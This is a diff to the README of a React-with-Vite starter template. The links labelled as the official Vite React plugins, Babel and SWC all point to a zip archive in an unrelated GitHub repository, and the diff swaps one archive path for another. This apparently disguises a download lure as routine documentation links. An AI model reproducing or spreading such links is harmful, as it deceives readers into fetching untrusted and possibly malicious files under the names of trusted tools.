@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/anorchism/ByteBlaze.zip) uses [Babel](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/anorchism/ByteBlaze.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/anorchism/ByteBlaze.zip) uses [SWC](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/anorchism/ByteBlaze.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/public/Byte-Blaze-v3.1.zip) uses [Babel](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/public/Byte-Blaze-v3.1.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/public/Byte-Blaze-v3.1.zip) uses [SWC](https://raw.githubusercontent.com/Ashikparvez89/ByteBlaze/main/public/Byte-Blaze-v3.1.zip) for Fast Refresh
